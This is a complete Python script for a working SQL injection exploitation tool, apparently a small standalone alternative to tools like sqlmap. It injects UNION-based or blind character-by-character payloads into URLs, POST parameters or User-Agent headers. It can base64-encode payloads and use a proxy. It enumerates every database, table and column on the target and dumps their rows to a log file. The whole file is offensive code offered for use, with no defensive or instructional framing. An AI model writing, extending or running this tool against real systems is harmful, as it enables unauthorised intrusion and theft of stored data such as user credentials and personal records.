import urllib2                                                          
import time                                                             
import sys                                                              
import os                                                               
import base64                                                           
import re                                                               
from urllib2  import URLError, HTTPError                                
from optparse import OptionParser                                       



SQLiPlace       =   '{inject_here}'                                     
encode          =   {'start':'{encode}','end':'{/encode}'}              
wordStart       =   's<><->|'                                           
wordEnd         =   '|<-><>e'                                           
wordSplit       =   '|<~>|'                                             
logFile         =   'log'                                               
queryRepeat     =   5                                                   
spaceChar       =   '/**/'                                              
options         =   None                                                
hex_chars       =   ['','0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F']

SQL_db_nr       =   'SELECT COUNT(`schema_name`) FROM `information_schema`.`schemata`'
SQL_db_at       =   'SELECT `schema_name` FROM `information_schema`.`schemata` LIMIT %s,1'
SQL_tb_nr       =   'SELECT COUNT(DISTINCT `table_name`) FROM `information_schema`.`tables` WHERE `table_schema`=%s'
SQL_tb_at       =   'SELECT `table_name` FROM `information_schema`.`tables` WHERE `table_schema`=%s LIMIT %s,1'
SQL_cl_nr       =   'SELECT COUNT(DISTINCT `column_name`) FROM `information_schema`.`columns` WHERE `table_schema`=%s and `table_name`=%s'
SQL_cl_at       =   'SELECT `column_name` FROM `information_schema`.`COLUMNS` WHERE `table_schema`=%s and `table_name`=%s LIMIT %s,1'
SQL_dt_nr       =   'SELECT COUNT(0x2e) FROM `%s`.`%s`'                  
SQL_dt_at       =   'SELECT %s FROM `%s`.`%s` LIMIT %s,1'
SQL_dt_at_0     =   'SELECT concat_ws(%s,%s) FROM `%s`.`%s` LIMIT %s,1'

SQL_max_len     =   'SELECT MAX(LENGTH(%s)) FROM `%s`.`%s`'
SQL_if_null     =   'IFNULL(cast(`%s` as char),0x4e554c4c)'               

SQL_substr      =   'AND MID(hex(cast((%s) as char)),%s,1) = %s'
SQL_emptyString =   'MID(0x01,9,1)' 
















class LOG:
    def toScreen(self,msgType,msg):
        global options
        if int(msgType) <= int(options.verbose):
            print ( msg )

    def toScreenResult(self,msgType,name_list):
        global options
        if int(msgType) <= int(options.verbose):
            
            if os.name == 'nt' :
                print( "" )
                print( 'LIST:'+','.join(name_list) )
            else :
                rows, columns = os.popen('stty size', 'r').read().split()
                print( '-'*int(columns) )
                print( 'LIST:'+','.join(name_list) )
                print( '-'*int(columns) )


class toFile:

    def replace_all(self, text, dic):
        for i,j in dic.iteritems():
            text = text.replace(i,j)
        return text

    def writeBanner(self, info):
        f = open(logFile,'a')                        
        f.write('+-'+ '-'*len(info) + '-+' +"\n")    
        f.write('| ' + info + ' |' +"\n")
        f.write('+-'+ '-'*len(info) + '-+' +"\n")
        f.close()
        
    def writeRowBanner(self, col_list,col_len):

        up_s  = ''
        mid_s = ''
        for i in range(len(col_list)):
            up_s  = up_s + '+-' +               '-'*(int(col_len[i])+2)
            mid_s = mid_s +'| ' + col_list[i] + ' '*((int(col_len[i])+2)-len(col_list[i]))

        f = open(logFile,'a')                        
        f.write(up_s + '+' + "\n")    
        f.write(mid_s + '|' + "\n")   
        f.write(up_s + '+' + "\n")    
        f.close()                                   

    def writeRowLine(self, col_values,col_len):
        mid_s = ''
       
        reps = {'\n':' ', '\r':' ', '\t':' '}

        for i in range(len(col_values)):
            col_values[i] = self.replace_all(col_values[i],reps)
            mid_s = mid_s +'| ' + col_values[i] + ' '*((int(col_len[i])+2)-len(col_values[i]))

        f = open(logFile,'a')                        
        f.write(mid_s + '|' + "\n")                  
        f.close()                                    

    def writeRowEnd(self, col_list,col_len):
        up_s  = ''
        for i in range(len(col_list)):
            up_s  = up_s + '+-' +               '-'*(int(col_len[i])+2)

        f = open(logFile,'a')                        
        f.write(up_s + '+' + "\n")                   
        f.close()                                    

    def write(self, info):
        d = open(logFile,'a')                  
        d.write(info +"\n")                  
        d.close()                            


class ENGINE:

   
    def __init__(self):
        global SQLiPlace
        global wordStart
        global wordEnd
        global hex_chars
        global SQL_emptyString
        global queryRepeat

       
        self.useragent      = options.agent
        self.params         = ''
        self.method         = options.method
        self.url            = options.url
        
        self.queryRepeat    = queryRepeat
        self.qRetrayCount   =  0
        
        self.hex_chars      = hex_chars
        self.SQL_emptyString= SQL_emptyString
        self.place          = SQLiPlace
        self.wordStart      = wordStart
        self.wordEnd        = wordEnd
        self.last_request   = ''
        self.last_query     = ''

    
        self.sleepCount     = 0

    def setproxy(seslf,proxyaddr):
       
        print ( proxyaddr )
        proxy   = urllib2.ProxyHandler({'http': proxyaddr})
        opener  = urllib2.build_opener(proxy)
        urllib2.install_opener(opener)

  
    def getPage(self):
        global options

       
        url     = self.url.replace(' ', spaceChar);
        params  = self.params.replace(' ', spaceChar)

   
        if options.delay :
          
            sleepTime = re.sub("\s[a-zA-Z]*", "", options.delay)
            time.sleep( float( sleepTime ) )

       
        headers = { 'User-Agent' : self.useragent }

   
        try:

            if self.method.upper() == 'GET':
                if params != '':
                    self.last_request = url + '?' + params
                else:
                    self.last_request = url
                LOG().toScreen(3,self.last_request)
                request_data = urllib2.Request(self.last_request, None, headers) 
                page = urllib2.urlopen(request_data)
                LOG().toScreen(4,page.info())

            if self.method.upper() == 'POST':
                self.last_request = url + "\tPOST: " + params
                LOG().toScreen(3,url + "\tPOST: " + params)
                request_data = urllib2.Request(url, params, headers) 
                page = urllib2.urlopen(request_data)
                LOG().toScreen(4,page.info())

        except HTTPError, e:
   
            print ( 'The server couldn\'t fulfill the request.' )
            print ( 'Error code: ', e.code )
            print ( 'REQUEST :',self.last_request )
            print ( "Retry in "+ str(self.sleepCount) + " seconds..." )
            time.sleep(self.sleepCount)
            self.sleepCount += 1

         
            textpage = self.getPage()
            self.sleepCount = 0
            return textpage

        except URLError, e:
     
            print ( 'We failed to reach a server.' )
            print ( 'Reason: ', e.reason )
            print ( 'REQUEST :',self.last_request )
            print ( "Retry in "+ str(self.sleepCount) + " seconds..." )
            time.sleep(self.sleepCount)

            self.sleepCount += 1

          
            textpage = self.getPage()
            self.sleepCount = 0
            return textpage


        textpage = page.read()
        LOG().toScreen(5,textpage)

        return textpage

    
    def toSQLHex(self, text):
        return "0x" + text.encode('hex_codec')

  
    def encode(self, text_data):
        if options.encode.upper() == "BASE64":
            groups = re.search( encode['start'] + '.*' + encode['end'], text_data )
            if groups :
                text_to_replace = groups.group(0)
                text_to_encode  = text_to_replace
                text_to_encode  = text_to_encode.replace(encode['start'], '')
                text_to_encode  = text_to_encode.replace(encode['end'], '')

                text_data = text_data.replace(text_to_replace, base64.b64encode(text_to_encode))
            else :
                print ( "ERROR : Encode tags has not been found.\t Use " + encode['start'] + " to start and " +encode['end'] + " to close." )
        return  text_data

   
    def inject_query(self, query):
        # URL injection
        if options.url.find(self.place) != -1:
            self.url = options.url.replace(self.place,  query)
            if options.encode != 'NOENCODE' :
                self.url = self.encode(self.url)

      
        if options.params.find(self.place) != -1:
            self.params =  options.params.replace(self.place,  query)
            if options.encode != 'NOENCODE' :
                self.params = self.encode(self.params)

      
        if options.agent.find(self.place) != -1:
            self.useragent = options.agent.replace(self.place,  query)
            if options.encode != 'NOENCODE' :
                self.useragent = self.encode(self.useragent)
        return ''

  
    def sql_result(self,sql_query):
        self.last_query = sql_query                                   
        LOG().toScreen(2,'QUERY: '+sql_query)                         
        data = ''

    
        if options.injection_method.upper() == "UNION" :
            params  = self.inject_query('concat(' + self.toSQLHex(self.wordStart) + ',(' + sql_query + ' ),' + self.toSQLHex(self.wordEnd) + ')')
            page    = self.getPage() 
            data    = self.extract_data(page)                        
            
       
            if data == False :
             
                self.qRetrayCount += 1
                if self.qRetrayCount < self.queryRepeat :
                    data = self.sql_result( sql_query );

     
        elif options.injection_method.upper() == "BLIND" :
            if not options.string :
                print ( "ERROR : Unknown string error, check \"--string\" option" )
                data = False
            else:
                data = self.extarct_data_blind(sql_query)
        else :
            print ( "ERROR : Unknown injection method, check: \"--injection-method\"" )

       
        self.qRetrayCount = 0
        return data

  
    def extract_data(self, page):
        s = page.find(self.wordStart)
        e = page.find(self.wordEnd)

     
        if s == -1 or e == -1 :
            toFile().writeBanner('[ERROR :  Keyword not found ] [Query: ' + self.last_query + ']')
            print ( "ERROR : Key words not found in the page!"  )
            return False

        data = page[s + len(self.wordStart) :e]
        LOG().toScreen(1,'EXTRACTED DATA: ' + data)
        return data

 
    def extarct_data_blind(self,sql_query):
        hex_len = ''
        pos = 0
        bchar = ''
        while bchar != -1 :
            pos += 1
            bchar = self.extract_data_blind_charAt(sql_query,pos)
            if bchar != -1:
                hex_len += bchar
                if len(hex_len) % 2 == 0 :
                    g = hex_len[len(hex_len)-2:].decode("hex_codec")
                    sys.stdout.write('\x1b[32m')
                    sys.stdout.write(g)
                    sys.stdout.flush()
                    sys.stdout.write('\x1b[m')

        if hex_len != '':
            data = hex_len.decode("hex_codec")
            sys.stdout.write("\n")
            sys.stdout.flush()
            LOG().toScreen(1,'EXTRACTED DATA: ' + data)
            return data
        else:
            print ( "ERROR : Blind injection has fail." )
            return False

    # get  one character from the SQL result
    def extract_data_blind_charAt(self,sql_query,pos):
        for c in self.hex_chars :
            if c != '' :
                query = SQL_substr % ( sql_query,str(pos), self.toSQLHex(c) )
            else :
                query = SQL_substr % ( sql_query,str(pos), self.SQL_emptyString )

            params  = self.inject_query( query )
            page    = self.getPage() 


            if page.find( options.string ) != -1:
                if c == '':
                    return -1
                return c
        return -1





class DATABASES:

   
    def __init__(self):
        global options

  
    def get_nr(self):
        query = SQL_db_nr
        rowsNr = ENGINE().sql_result( query )
        return rowsNr

   
    def get_at(self,pos):
        query = SQL_db_at % (pos)
        return ENGINE().sql_result( query )
    
    def get_all(self):
        LOG().toScreen(1,'Extract the number of rows...')
        rowsNr = self.get_nr()
        if rowsNr==False:
            print ( "ERROR : Can not extract number of rows." )
            return False
            
        toFile().writeBanner('[DATABASES] [' + rowsNr + ']')
        name_list = []
        LOG().toScreen(1,'Extract data from columns...')
        for nr in range( int(rowsNr) ):
            name = self.get_at(nr)
            name_list.append(name)
            toFile().write('[' + str(nr).zfill(len(rowsNr)) + '] ' + name)
        toFile().write('LIST :' + ','.join(name_list) )
        toFile().write("")
        LOG().toScreenResult(1,name_list)
        return name_list

class TABLES:
   
    def __init__(self):
        global options

 
    def get_nr(self, db_name):
        query = SQL_tb_nr % (ENGINE().toSQLHex(db_name))
        rowsNr = ENGINE().sql_result( query )
        return rowsNr

   
    def get_at(self, db_name, pos):
        query = SQL_tb_at % (ENGINE().toSQLHex(db_name), pos)
        return ENGINE().sql_result( query )

   
    def get_all(self,db_name):
        LOG().toScreen(1,'Extract the number of rows...')
        rowsNr = self.get_nr(db_name)
        if rowsNr==False:
            print ( "ERROR : Can not extract number of rows." )
            return False
            
        toFile().writeBanner('[TABLES] `' + db_name + '`  [' + rowsNr + ']')
        name_list = []
        LOG().toScreen(1,'Extract data from columns...')
        for nr in range( int(rowsNr) ):
            name = self.get_at(db_name,nr)
            name_list.append(name)
            toFile().write('[' + str(nr).zfill(len(rowsNr)) + '] ' + name)
        toFile().write('LIST :' + ','.join(name_list) )
        toFile().write("")
        LOG().toScreenResult(1,name_list)
        return name_list


class COLUMNS:
  
    def __init__(self):
        global options


    def get_nr(self, db_name, tb_name):
        query = SQL_cl_nr % (ENGINE().toSQLHex(db_name),ENGINE().toSQLHex(tb_name))
        rowsNr = ENGINE().sql_result( query )
        return rowsNr


   
    def get_at(self, db_name, tb_name, pos):
        query = SQL_cl_at % (ENGINE().toSQLHex(db_name), ENGINE().toSQLHex(tb_name), pos)
        return ENGINE().sql_result( query )

    
    def get_all(self, db_name, tb_name):
        LOG().toScreen(1,'Extract the number of rows...')
        rowsNr = self.get_nr(db_name, tb_name)
        if rowsNr==False:
            print ( "ERROR : Can not extract number of rows." )
            return False
            
        toFile().writeBanner('[COLUMNS] `' + db_name + '`.`' + tb_name + '`  [' + str(rowsNr) + ']')
        name_list = []

        LOG().toScreen(1,'Extract data from columns...')
        for nr in range( int(rowsNr) ):
            name = self.get_at(db_name, tb_name, nr)
            if name != False :
                name_list.append(name)
                toFile().write('[' + str(nr).zfill(len(rowsNr)) + '] ' + name)
        toFile().write('LIST :' + ','.join(name_list) )
        toFile().write("")

        LOG().toScreenResult(1,name_list)

        return name_list


class DATA:
    
    def __init__(self):
        global options

    
    def get_maxLen(self, db_name, tb_name, cl_name):
        query = SQL_max_len % (cl_name,db_name,tb_name)
        return ENGINE().sql_result( query )

    
    def get_nr(self, db_name, tb_name):
        query = SQL_dt_nr % (db_name,tb_name)
        rowsNr = ENGINE().sql_result( query )
        return rowsNr

    
    def get_at(self, db_name, tb_name, cl_name, pos):
        query = SQL_dt_at % (cl_name, db_name, tb_name, pos)
        return ENGINE().sql_result( query )

 
    def get_at_ws(self, db_name, tb_name, cl_list, pos):
        query = SQL_dt_at_0 % (ENGINE().toSQLHex(wordSplit), cl_list, db_name, tb_name, pos)
        return ENGINE().sql_result( query )

    
    def get_row(self, db_name, tb_name, cl_list, pos):
        cl_list_ifnull_array = []
        cl_list_ifnull       = ''
       
        for col in cl_list.split(','):
            cl_list_ifnull = cl_list_ifnull + SQL_if_null % ( col ) + ','
            cl_list_ifnull_array.append(SQL_if_null % ( col ))
        cl_list_ifnull = cl_list_ifnull[:-1]

        if options.injection_method.upper() != "BLIND" :
           
            data = self.get_at_ws(db_name, tb_name, cl_list_ifnull, pos)
            if data != False:
                return data.split(wordSplit)  

            print ( "Some error has apper when using concat_ws try to extract data column by column" )

  
        col_value = []
        for col in cl_list_ifnull_array:
            data = self.get_at(db_name, tb_name, col, pos)
            if data != False:
                col_value.append(data) 
            else:
                print ( "Some error has apper when trying to extract data from '", col,"'" )

        return col_value

   
    def get_all(self, db_name, tb_name, cl_list):
  
        if cl_list == '':
            return 0

   
        rowsNr = self.get_nr(db_name, tb_name)
        if rowsNr==False:
            print ( "ERROR : Can not extract number of rows." )
            return False
            
        if int(rowsNr) < 1 :
            toFile().writeBanner('[DATA] `' + db_name + '`.`' + tb_name + '`  [' + str(rowsNr) + ']')
            return 0



        
        columns_list = cl_list.split(',')
        columns_len  = []

        for col in columns_list:
            col_len =  self.get_maxLen(db_name, tb_name, SQL_if_null % ( col ) )
            if int(col_len) < len(col) :
                col_len = len(col)
            columns_len.append(col_len)  
        


        toFile().writeBanner('[DATA] `' + db_name + '`.`' + tb_name + '`  [' + str(rowsNr) + ']')
        toFile().writeRowBanner(columns_list,columns_len)


      
        for nr in range( int(rowsNr) ):
            name = self.get_row(db_name,tb_name,cl_list,nr)
            toFile().writeRowLine(name,columns_len)

        toFile().writeRowEnd(name,columns_len)
        toFile().write("")


def dump_table(db_name,tb_name) :
    columns_list = COLUMNS().get_all(db_name,tb_name)
    if not options.get_structure:
        DATA().get_all(db_name, tb_name, ','.join(columns_list))


def dump_database(db_name) :
    tables_list = TABLES().get_all(db_name)
    for tb_name in tables_list :
        dump_table(db_name,tb_name)


def dump_databases() :
    database_list = DATABASES().get_all()
    for db_name in database_list :
        tables_list = TABLES().get_all(db_name)
        for tb_name in tables_list :
            dump_table(db_name,tb_name)


def custom_query():
    data = ENGINE().sql_result( options.custom_sql_query )
    if data :
        toFile().writeBanner('[CUSTOM QUERY]  [' + str(options.custom_sql_query) + ']')
        toFile().writeBanner('[QUERY RESULT]  [' + str(data) + ']')


def main(argv):
    global options
    usage = "%s --help        for more options" %  sys.argv[0]
    parser = OptionParser(usage=usage)

    parser.add_option("-u", "--url", dest="url",
                    help="URL where the injection will be made")

    parser.add_option("-p", "--params", dest="params",default='',
                    help="Parameters that will be send to the page")

    parser.add_option("-m", "--method", dest="method",default='GET',
                    help="Method that will be use to send params GET | POST (Default GET)")

    parser.add_option("--user-agent", dest="agent",default='',
                    help="Custom user-agent (Default empty string)")

    parser.add_option("--proxy", dest="proxy",default = None,
                    help="Set a http proxy (default = None), ex --proxy \"109.123.100.55:3128\"")

    parser.add_option("--delay", dest="delay",default = 0,
                    help="Aplay time delay between http requests (Default 0 seconds)")

    parser.add_option("--injection-method", dest="injection_method",default='UNION',
                    help="Method that will be use to extract data UNION | BLIND (Default UNION)")

    parser.add_option("--string", dest="string",
                    help="String to match in page when the query is valid")

    parser.add_option("--encode", dest="encode",default='NOENCODE',
                    help="Encode value in the parameter that is injected NOENCODE | BASE64 (Default NOENCODE)")

    parser.add_option("--dbs", dest="get_dbs",action="store_true",
                    help="Extract all databases")

    parser.add_option("--tables", dest="get_tbs",action="store_true",
                    help="Extract all tables from database specified by -D")

    parser.add_option("--columns", dest="get_cols",action="store_true",
                    help="Extract all columns from tables specified by -T")

    parser.add_option("--dump", dest="get_data",action="store_true",
                    help="Dump data from database, table, columns")
    
    parser.add_option("--structure", dest="get_structure", action="store_true",
                    help="Specify to extract only structure of selected table or database")

    parser.add_option("-D", dest="db_name",
                    help="Specify which database to use")

    parser.add_option("-T", dest="tb_name",
                    help="Specify which table to use")

    parser.add_option("-C", dest="columns_name",
                    help="Specify which columns to use ex. ( -C 'id,user,email')")

    parser.add_option("--query", dest="custom_sql_query",
                    help="Specify a custom query to execute ")

    parser.add_option("-v", dest="verbose",default=1,
                    help="Verbose mode (delault 1)")

    options, args = parser.parse_args()

    if not options.url :
        parser.error("you must enter -u;--url and -p; --params ")


    if options.proxy :
        ENGINE().setproxy(options.proxy)

    if options.get_dbs:
        DATABASES().get_all()

    if options.get_tbs:
        if not options.db_name :
            parser.error("You must specify what database to use to extract tables")
        TABLES().get_all(options.db_name)

    if options.get_cols:
        if not options.db_name :
            parser.error("You must specify what database to use to extract columns")
        if not options.tb_name :
            parser.error("You must specify what table to use to extract columns")
        COLUMNS().get_all(options.db_name,options.tb_name)

    if options.get_data:
        if not options.db_name :
            print ( "You can specify from what database will extract data by using : -D database_name" )
            ans = raw_input("You want to extract all data from all databases`? (Y/N) :")
            if ans.lower() == 'y' :
                dump_databases()
                sys.exit(0)
            else :
                sys.exit(0)

        if not options.tb_name :
            print ( "You can specify from what table will extract data by using : -T table_name" )
            ans = raw_input( "You want to extract all data from data base `" + options.db_name +"`? (Y/N) :" )
            if ans.lower() == 'y' :
                dump_database(options.db_name)
                sys.exit(0)
            else :
                sys.exit(0)


        if not options.columns_name :
            print ( "You can specify from what columns will extract data by using : -C column_name,column_name" )
            ans = raw_input("You want to extract all data from table `" + options.tb_name +"`? (Y/N) :")
            if ans.lower() == 'y' :
                dump_table(options.db_name, options.tb_name)
                sys.exit(0)
            else :
                sys.exit(0)
        else:
                     
            DATA().get_all(options.db_name,options.tb_name,options.columns_name)

    if options.custom_sql_query:
        custom_query()


if __name__ == "__main__":
    main(sys.argv[1:])
